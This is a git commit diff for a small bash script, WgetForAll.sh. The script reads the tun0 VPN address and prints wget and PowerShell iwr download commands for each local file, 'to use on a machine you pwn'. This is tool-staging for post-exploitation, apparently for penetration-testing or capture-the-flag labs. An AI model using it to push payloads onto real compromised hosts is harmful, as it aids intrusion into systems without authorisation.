9b81ad98d50bbf4bfb4306b6201c0995ef55da72
Tom R. <137434709+mr-tomr@users.noreply.github.com>
2024-08-29 13:45:40 -0400

    Added iwr for windows

--- WgetForAll.sh
+++ WgetForAll.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-Run in current directory and you will get a wget command for each file, to use on a machine you pwn.
+# Run in the current directory and you will get a wget command (for Linux) and an iwr command (for PowerShell) for each file, to use on a machine you pwn.
 
 # One liner
-# IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') && [ -n "$IP_ADDRESS" ] && for file in *; do [ -f "$file" ] && echo "wget http://$IP_ADDRESS/$file"; done
+# IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') && [ -n "$IP_ADDRESS" ] && for file in *; do [ -f "$file" ] && echo "wget http://$IP_ADDRESS/$file"; done && for file in *; do [ -f "$file" ] && echo "iwr -Uri http://$IP_ADDRESS/$file -OutFile $file"; done
 
 # Get the IP address of tun0
 IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
@@ -14,10 +14,20 @@ if [ -z "$IP_ADDRESS" ]; then
   exit 1
 fi
 
-# Iterate over each file in the current directory
+# First, print all wget commands
 for file in *; do
   # Check if it's a regular file
   if [ -f "$file" ]; then
     echo "wget http://$IP_ADDRESS/$file"
+  fi
+done
+
+echo
+
+# Then, print all iwr commands
+for file in *; do
+  # Check if it's a regular file
+  if [ -f "$file" ]; then
+    echo "iwr -Uri http://$IP_ADDRESS/$file -OutFile $file"
   fi
 done
